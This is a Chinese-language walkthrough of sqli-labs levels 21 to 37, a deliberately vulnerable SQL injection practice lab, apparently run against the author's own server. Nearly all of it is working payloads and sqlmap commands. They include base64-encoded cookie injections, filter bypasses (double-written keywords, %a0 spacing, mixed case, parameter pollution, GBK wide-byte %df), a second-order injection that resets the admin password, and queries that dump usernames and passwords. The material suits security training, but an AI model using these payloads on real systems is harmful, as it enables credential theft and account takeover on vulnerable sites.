# **Less-21** 

**Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)**



 Cookie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可

爆位置paylaod

### 手工注入

**注uname的值为不正确的**

```
-admin') union select 1,2,3#

Cookie: uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMiwzIw==
```

暴库

```
-admin') union select 1,2,database()#


Cookie: uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw==
```

暴表

```
-admin') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#

 
Cookie: uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIw==
```

暴字段

```
-admin') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#

 
LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIw==
```

暴值

```
-admin') union select 1,2,group_concat(username,0x3a,password) from users#


LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodXNlcm5hbWUsMHgzYSxwYXNzd29yZCkgZnJvbSB1c2VycyM=
```

### sqlmap自动跑

```
sqlmap -u "http://daishen.ltd:1112/Less-21/" --cookie="uname=*" --tamper="base64encode" --dbms=MySQL --random-agent --flush-session --technique=U -v 3
```

暴库

```
sqlmap -u "http://daishen.ltd:1112/Less-21/" --cookie="uname=*" --tamper="base64encode" --dbms=MySQL --random-agent --flush-session --technique=U -v 3 --batch --dbs
```

暴表

```
sqlmap -u "http://daishen.ltd:1112/Less-21/" --cookie="uname=*" --tamper="base64encode" --dbms=MySQL --random-agent --flush-session --technique=U -v 3 --batch -D security --tables
```

暴列名

```
sqlmap -u "http://daishen.ltd:1112/Less-21/" --cookie="uname=*" --tamper="base64encode" --dbms=MySQL --random-agent --flush-session --technique=U -v 3 --batch -D security -T users --columns
```

暴数据

```
sqlmap -u "http://daishen.ltd:1112/Less-21/" --cookie="uname=*" --tamper="base64encode" --dbms=MySQL --random-agent --flush-session --technique=U -v 3 --batch -D security -T users -C username,password -dump
```

# **Less-22** 

**Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)**



和less-21一样的，只需要使用双引号代替单引号**再取掉括号****，**

# **Less-23** 

**GET - Error based - strip comments (基于错误的，过滤注释的GET型)**



**过滤了注释符号**所以只能构造闭合语句

确定字段数 

```
http://daishen.ltd:1112/Less-23/?id=1' and 1=2 order by 3 and '1' ='1
```

确定字段位置

```
http://daishen.ltd:1112/Less-23/?id=1' and 1=2 union select 1,2,3 and '1' ='1
```

暴库

```
http://daishen.ltd:1112/Less-23/?id=-1' union select 1,2,database() '
```

暴表

```
http://daishen.ltd:1112/Less-23/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and '1'='1
```

暴字段

```
http://daishen.ltd:1112/Less-23/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and '1'='1
```

暴内容

```
http://daishen.ltd:1112/Less-23/?id=-1' union select 1,2,group_concat(username,password) from users where 1 and '1'='1
```

# **Less - 24** 

**Second Degree Injections \*Real treat\* -Store Injections (二次注入)**



### 思路分析

从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。

**二次注入** 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。

先看创建用户的地方：

```sql
username =  mysql_escape_string($_POST['username']) ;
```

username 被 `mysql_escape_string` 函数过滤了，该函数的作用如下：

| 危险字符 | 转义后 |
| :------- | :----- |
| `\`      | `\\`   |
| `'`      | `\'`   |
| `"`      | `\"`   |

再看下更新密码的核心语句：

```sql
UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'
```

这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：`admin'#`，那么此时的完整语句就为：

```sql
UPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass'
```

此时就完全改变了语义，直接就修改掉了 admin 用户的密码。

### 步骤演示

常见一个`admin'#`开头的用户名，下面列举的几种都可以，以此类推，很灵活：

```none
admin'#1
admin'#233
admin'#gg
...
```

注册完成后数据库的记录信息如下：

```bash
mysql> select * from users;
+----+---------------+------------+
| id | username      | password   |
+----+---------------+------------+
| 20 | admin'#hacker | 111        |
+----+---------------+------------+
```

成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。

接下来登录 `admin'#hacker` 用户，然后来修改当前的密码

此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：

```bash
mysql> select * from users;
+----+---------------+------------+
| id | username      | password   |
+----+---------------+------------+
|  8 | admin         | 233        |
| 20 | admin'#hacker | 111        |
+----+---------------+------------+
```

# **Less-25**

 **Trick with OR & AND (过滤了or和and)**



### 双写嵌套绕过

暴位置

注：id的值为不正确的

```
http://daishen.ltd:1112/Less-25/?id=-1' union select 1,2,3 --+
```

暴库

```
http://daishen.ltd:1112/Less-25/?id=-1' union select 1,2,database() --+

http://daishen.ltd:1112/Less-25/?id=1' aandnd 1=2 union select 1,2,database() --+
```

爆表

```
http://daishen.ltd:1112/Less-25/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

过滤了or，在加一层or，所以双写or绕过

```
http://daishen.ltd:1112/Less-25/?id=-1' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+
```

暴字段

```
http://daishen.ltd:1112/Less-25/?id=-1' union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name='users' --+
```

暴值

同样password的or也会过滤成passwd

```
http://daishen.ltd:1112/Less-25/?id=-1' union select 1,2,group_concat(username,0x3a,passwoorrd) from users --+
```

### 符号替换

```none
or` -> `||
and` -> `&&
```



```none
?id=1'||extractvalue(1,concat(0x7e,database()))--+
```

# **Less-25a **

**Trick with OR & AND Blind （过滤了or和and的盲注）**



### 联合注入

暴库

```
?id=1 aandnd 1=2 union select 1,2,database() --+
```

暴表双写or

```
?id=1 aandnd 1=2 union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+
```

暴字段

```
?id=1 aandnd 1=2 union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name='users' --+
```

暴内容

```
?id=1 aandnd 1=2 union select 1,2,group_concat(username,passwoorrd) from  users  where 1--+
```

# **Less 26  **

**Trick with comments and space (过滤了注释和空格的注入)**



过滤了 or 和 and 可以采用 双写或者 && || 绕过

过滤注释 可以使用闭合绕过

过滤了空格 可以使用如下的符号来替代：

| 符号 | 说明         |
| :--- | :----------- |
| %09  | TAB 键(水平) |
| %0a  | 新建一行     |
| %0c  | 新的一页     |
| %0d  | return 功能  |
| %0b  | TAB 键(垂直) |
| %a0  | 空格         |

暴位置

||是或者的意思，'1则是为了闭合后面的 '，注意在hackbar中输入&&时，需要自行URL编码为%26%26，否则会报错，而输入||不需要，

**注：id的值为0，****’****单引号需要url转码成%27，空格转码为%a0**

```
http://daishen.ltd:1112/Less-26/?id=0' union select 1,2,3 ||'1

http://daishen.ltd:1112/Less-26/?id=0%27%a0union%a0select%a01,2,3%a0||%271
```

暴库

```
http://daishen.ltd:1112/Less-26/?id=0' union select 1,database(),3 ||'1

http://daishen.ltd:1112/Less-26/?id=0%27%a0union%a0select%a01,database(),3%a0||%271
```

爆表

**需要用&&连接闭合， &&'1'='1 ，&&用url转码后%26%26，**

```
http://daishen.ltd:1112/Less-26/?id=0' union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database() &&'1'='1

http://daishen.ltd:1112/Less-26/?id=0%27%a0union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()%a0%26%26%a0%271%27=%271
```

暴字段

**or过滤绕过**

```
http://daishen.ltd:1112/Less-26/?id=0' union select 1,group_concat(column_name) ,3 from infoorrmation_schema.columns where table_name='users' &&'1'='1

http://daishen.ltd:1112/Less-26/?id=0%27%a0union%a0select%a01,group_concat(column_name)%a0,3%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=%27users%27%a0%26%26%271%27=%271
```

暴值

```
http://daishen.ltd:1112/Less-26/?id=0' union select 1,group_concat(username,0x3a,passwoorrd),3 from users where 1=1 &&'1'='1

http://daishen.ltd:1112/Less-26/?id=0%27%a0union%a0select%a01,group_concat(username,0x3a,passwoorrd),3%a0from%a0users%a0where%a01=1%a0%26%26%271%27=%271
或者
http://daishen.ltd:1112/Less-26/?id=0' union select 1,group_concat(username,0x3a,passwoorrd),3 from users where '1'='1

http://daishen.ltd:1112/Less-26/?id=0%27%a0union%a0select%a01,group_concat(username,0x3a,passwoorrd),3%a0from%a0users%a0where%a0%271%27=%271
```

后面多了where '1'='1,是为了让语句变成无约束查询

# **Less 26a **

**GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)**



暴位置

**注：Id的值为不正确的**

```
http://daishen.ltd:1112/Less-26a/?id=0') union select 1,2,3 anandd ('1')=('1

http://daishen.ltd:1112/Less-26a/?id=0') %a0union%a0select%a01,2,3%a0anandd%a0('1')=('1
```

暴库

```
http://daishen.ltd:1112/Less-26a/?id=0') %a0union%a0select%a01,database(),3%a0anandd%a0('1')=('1
```

暴表

```
http://daishen.ltd:1112/Less-26a/?id=0') %a0union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema%a0=database()%a0anandd%a0('1')=('1
```

暴字段

```
http://daishen.ltd:1112/Less-26a/?id=0') %a0union%a0select%a01,group_concat(column_name),3%a0from%a0infoorrmation_schema.columns%a0where%a0table_name%a0='users'%a0anandd%a0('1')=('1
```

暴值

```
http://daishen.ltd:1112/Less-26a/?id=0') %a0union%a0select%a01,group_concat(username,passwoorrd),3%a0from%a0users%a0where%a0('1')=('1
```

# **Less 27**

**GET - Error Based- All your UNION & SELECT belong to us （过滤了union和select的**



union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。

```bash
# 大小写混写
unioN
unIon
seLect
...

# 嵌套双写
uunionnion
sselectelect
ununionion
...
```

使用大小写来绕过

暴位置

```
http://daishen.ltd:1112/Less-27/?id=0' uniOn selEct 1,2,3 && '1'='1

http://daishen.ltd:1112/Less-27/?id=0'%a0uniOn%a0sElect%a01,2,3%a0%26%26%a0'1'='1
```

暴库

```
http://daishen.ltd:1112/Less-27/?id=0' uniOn selEct 1,database(),3 && '1'='1

http://daishen.ltd:1112/Less-27/?id=0'%a0uniOn%a0selEct%a01,database(),3%a0%26%26%a0'1'='1
```

爆表

```
http://daishen.ltd:1112/Less-27/?id=0' uniOn selEct 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() && '1'='1

http://daishen.ltd:1112/Less-27/?id=0'%a0uniOn%a0selEct%a01,group_concat(table_name),3%a0from%a0information_schema.tables%a0where%a0table_schema=database()%a0%26%26%a0'1'='1
```

暴字段

```
http://daishen.ltd:1112/Less-27/?id=0' uniOn selEct 1,group_concat(column_name),3 from information_schema.columns where table_name='users' && '1'='1

http://daishen.ltd:1112/Less-27/?id=0'%a0uniOn%a0selEct%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'%a0%26%26%a0'1'='1
```

暴值

```
http://daishen.ltd:1112/Less-27/?id=0' uniOn selEct 1,group_concat(username,0x3a,password),3 from users where '1'='1

http://daishen.ltd:1112/Less-27/?id=0'%a0uniOn%a0selEct%a01,group_concat(username,0x3a,password),3%a0from%a0users%a0where%a0'1'='1
```

# Less 27a 

**GET - Blind Based- All your UNION & SELECT belong to us**（过滤了union和select 盲注版本** **）**

暴位置

```
http://daishen.ltd:1112/Less-27a/?id=0" uniOn sElect 1,2,3 && "1"="1

http://daishen.ltd:1112/Less-27a/?id=0"%a0uniOn%a0sElect%a01,2,3%a0%26%26%a0"1"="1
```

暴库

```
http://daishen.ltd:1112/Less-27a/?id=0" uniOn sElect 1,database(),3 && "1"="1

http://daishen.ltd:1112/Less-27a/?id=0"%a0uniOn%a0sElect%a01,database(),3%a0%26%26%a0"1"="1
```

爆表

```
http://daishen.ltd:1112/Less-27a/?id=0" uniOn sElect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() && "1"="1

http://daishen.ltd:1112/Less-27a/?id=0"%a0uniOn%a0sElect%a01,group_concat(table_name),3%a0from%a0information_schema.tables%a0where%a0table_schema=database()%a0%26%26%a0"1"="1
```

暴字段

```
http://daishen.ltd:1112/Less-27a/?id=0" uniOn sElect 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ && "1"="1

http://daishen.ltd:1112/Less-27a/?id=0"%a0uniOn%a0sElect%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'%a0%26%26%a0"1"="1
```

暴值

```
http://daishen.ltd:1112/Less-27a/?id=0" uniOn sElect 1,group_concat(username,0x3a,password),3 from users where "1"="1

http://daishen.ltd:1112/Less-27a/?id=0"%a0uniOn%a0sElect%a01,group_concat(username,0x3a,password),3%a0from%a0users%a0where%a0"1"="1
```

# **Less 28 **

**GET - Error Based- All your UNION & SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入**

这里 union 和 select 这里可以使用双写嵌套大小写绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过

暴位置

```
http://daishen.ltd:1112/Less-28/?id=0') uniOn sElect 1,2,3 && ('1')=('1

http://daishen.ltd:1112/Less-28/?id=0')%a0uniOn%a0sElect%a01,2,3%a0%26%26%a0('1')=('1
```

暴库

```
http://daishen.ltd:1112/Less-28/?id=0') uniOn sElect 1,database(),3 && ('1')=('1

http://daishen.ltd:1112/Less-28/?id=0')%a0uniOn%a0sElect%a01,database(),3%a0%26%26%a0('1')=('1
```

暴表

```
http://daishen.ltd:1112/Less-28/?id=0') uniOn sElect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() && ('1')=('1

http://daishen.ltd:1112/Less-28/?id=0')%a0uniOn%a0sElect%a01,group_concat(table_name),3%a0from%a0information_schema.tables%a0where%a0table_schema=database()%a0%26%26%a0('1')=('1
```

暴字段

```
http://daishen.ltd:1112/Less-28/?id=0') uniOn sElect 1,group_concat(column_name),3 from information_schema.columns where table_name='users' && ('1')=('1

http://daishen.ltd:1112/Less-28/?id=0')%a0uniOn%a0sElect%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'%a0%26%26%a0('1')=('1
```

暴值

```
http://daishen.ltd:1112/Less-28/?id=0') uniOn sElect 1,group_concat(username,0x3a,password),3 from users where ('1')=('1

http://daishen.ltd:1112/Less-28/?id=0')%a0uniOn%a0sElect%a01,group_concat(username,0x3a,password),3%a0from%a0users%a0where%a0('1')=('1
```

# **Less 28a **

**GET - Bind Based- All your UNION & SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入**

与上题Less-28a差不多，也可以用联合查询暴出数据

# **Less 29 **

GET -Error based- IMPIDENCE MISMATCH- Having a WAF in front of web application.
基于获取错误的-IMPIDENCE失配-在Web应用程序前面有一个WAF。

###  index.php

暴位置

```
http://daishen.ltd:1112/Less-29/?id=1&id=0' union select 1,2,3 --+
```

暴库

```
http://daishen.ltd:1112/Less-29/?id=1&id=0'' union select 1,2,database() --+
```

爆表

```
http://daishen.ltd:1112/Less-29/?id=1&id=0'' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

暴字段

```
http://daishen.ltd:1112/Less-29/?id=1&id=0'' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```

暴值

```
http://daishen.ltd:1112/Less-29/?id=1&id=0' union select 1,2,group_concat(username,0x3a,password) from users --+
```

waf绕过方法

waf是只允许输入数字的，我们在输入数字的时候先给waf看然后检测正常后才转发给我们需要访问的页面，弄2个值，一个是用来欺骗waf的。另一个才是给我们需要访问页面的

### login.php

- `login.php`

```php
# 查询 query 的字符串
$qs = $_SERVER['QUERY_STRING'];

# 模拟 tomcat 的查询函数 处理一下
$id1=java_implimentation($qs);
$id=$_GET['id'];

# 再次过滤检测
whitelist($id1);

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";

if 查询到结果:
    输出查询的详细信息
else:
    print_r(mysql_error());
?>

function java_implimentation($query_string)
{
    $q_s = $query_string;
    # & 作为分隔符 分割字符串
    $qs_array= explode("&",$q_s);

    # 遍历 qs_array 数组
    foreach($qs_array as $key => $value)
    {    
        $val=substr($value,0,2);
        # 如果数组前两位是 id 的话
        if($val=="id")
        {    
            # 截取 $value 的3-30 的字符串 作为 id 的值 
            $id_value=substr($value,3,30); 
            return $id_value;
            echo "<br>";
            break;
        }
    }
}

function whitelist($input)
{
    # 过滤规则 检测数字
    $match = preg_match("/^\d+$/", $input);
    if 不符合规则：
        header('Location: hacked.php');
}
```

从代码中还是很容易发现问题的，关键问题出在下面的地方：

```php
$id1=java_implimentation($qs);
...
whitelist($id1);
whitelist` 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 `hacked.php`，这里是没毛病的。那么问题出在了这里函数`$id1=java_implimentation($qs);
```

因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 `return $id_value`，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。

假设用户输入这样的语句：

```php
index.php?id=1&id=2
```

Apache PHP 会解析最后一个参数

Tomcat JSP 会解析第一个参数

知道这个原理的话后面尝试直接注入吧：

```payload
login.php?id=1&id=-2' union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+
```

(有点懵，直接贴国光大佬的原话)

# Less 30

GET - BLIND - IMPIDENCE MISMATCH- Having a WAF in front of web application.
GET-盲注-IMPIDENCE不匹配-有一个WAF在前面的Web应用程序。

和 Less-29 相比没有啥本质变化，只是拼接方式换成了id=1&id=0" 

# Less-31

加单引号--未报错

加双引号--报错

尝试双引号+右括号  ”)  再加注释 -- 未报错

和 Less-29 相比没有啥本质变化，只是拼接方式换成了id=1&id=0" ）

# Less-32

**宽字节注入原理**

MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 `%aa%5c` 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 `\`，所以这里想办法干掉反斜杠即可。

1. `%df` 吃掉 `\`

具体的原因是 `urlencode(\') = %5c%27`，我们在`%5c%27` 前面添加`%df`，形 成`%df%5c%27`，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把`%df%5c` 当做是一个汉字，`%27` 则作为一个单独的符号在外面，同时也就达到了我们的目的。

2.将 `\'` 中的 `\` 过滤掉

例如可以构造 `%5c%5c%27` 的情况，后面的`%5c`会被前面的`%5c` 给注释掉。这也是 bypass 的一种方法。

本关卡采用第一种 %df 宽字节注入来吃掉反斜杠

暴位置

```
http://daishen.ltd:1112/Less-32/?id=-1%df' union select 1,2,3 --+
```

暴库和版本

```
http://daishen.ltd:1112/Less-32/?id=-1%df' union select 1,version(),database() --+
```

暴表

```
http://daishen.ltd:1112/Less-32/?id=-1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

暴字段

**使用十六进制编码就可以绕过了''使用0x 代替，users 使用十六进制编码得到7573657273，构造为0x7573657273**

```
http://daishen.ltd:1112/Less-32/?id=-1%df' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+
```

暴值

```
http://daishen.ltd:1112/Less-32/?id=-1%df' union select 1,2,group_concat(username,0x3a,password) from users --+
```

# Less-33

拼接方式也是一样的，过滤方法细节有点变化，具体如下：

```php
function check_addslashes($string)
{
    $string= addslashes($string);    
    return $string;
}
```

`addslashes()` 函数返回在预定义字符之前添加反斜杠的字符串。

| 预定义字符 | 转义后 |
| :--------- | :----- |
| `\`        | `\\`   |
| `'`        | `\'`   |
| `"`        | `\"`   |

该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。

> 注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞

# Less-34

**宽字节post注入**

### 联合注入：

过滤方法依然和 Less-33 一致：

```php
$uname = addslashes($uname1);
$passwd= addslashes($passwd1);
```

只是由 GET 型变成了 POST 型

暴位置

```
uname=-admin%df' union select 1,2 --+&passwd=admin&submit=Submit
```

暴库和版本

```
uname=-admin%df' union select version(),database() --+&passwd=admin&submit=Submit
```

爆表

```
uname=-admin%df' union select 2,group_concat(table_name) from information_schema.tables where table_schema=database() --+&passwd=admin&submit=Submit
```

暴字段

**使用十六进制编码就可以绕过了''使用0x 代替，users 使用十六进制编码得到7573657273，构造为0x7573657273**

```
uname=-admin%df' union select 2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+&passwd=admin&submit=Submit
```

暴值

```
uname=-admin%df' union select 2,group_concat(username,0x3a,password) from users --+&passwd=admin&submit=Submit
```

### 报错注入

暴库

```
uname=admin%df' and extractvalue(1,concat(0x23,database(),0x23))--+&passwd=admin&submit=Submit
```

暴表

```
uname=admin%df' and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x23))--+&passwd=admin&submit=Submit

uname=admin%df' and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x23))--+&passwd=admin&submit=Submit
```

暴列名

**使用十六进制编码就可以绕过了''使用0x 代替，users 使用十六进制编码得到7573657273，构造为0x7573657273**

```
uname=admin%df' and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 1,1),0x23))--+&passwd=admin&submit=Submit

uname=admin%df' and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 2,1),0x23))--+&passwd=admin&submit=Submit
```

暴字段

```
uname=admin%df' and extractvalue(1,concat(0x23,(select username from users order by id limit 2,1),0x23))--+&passwd=admin&submit=Submit
```



# Less-35

加个单引号

```
http://daishen.ltd:1112/Less-35/?id=1'
```

id周围没有单引号或双引号，现在就明白题目的标题了，不需要要过，直接注入

```
http://daishen.ltd:1112/Less-35/?id=-1%E3' union select 1,2,group_concat(username,0x3a,password) from users --+
```

# Less-36

这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：

| 危险字符 | 转义后 |
| :------- | :----- |
| `\`      | `\\`   |
| `'`      | `\'`   |
| `"`      | `\"`   |

### 报错注入

```
http://daishen.ltd:1112/Less-36/?id=-1%df%27%20and%20extractvalue(1,concat(0x23,(select%20username%20from%20users%20order%20by%20id%20limit%202,1),0x23))--+
```

### 联合注入

```
http://daishen.ltd:1112/Less-36/?id=-1%df%27%20union%20select%201,2,group_concat(username,0x3a,password)%20from%20users%20--+
```

# Less-37

```
uname=admin%df' and 1=2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&passwd=
```

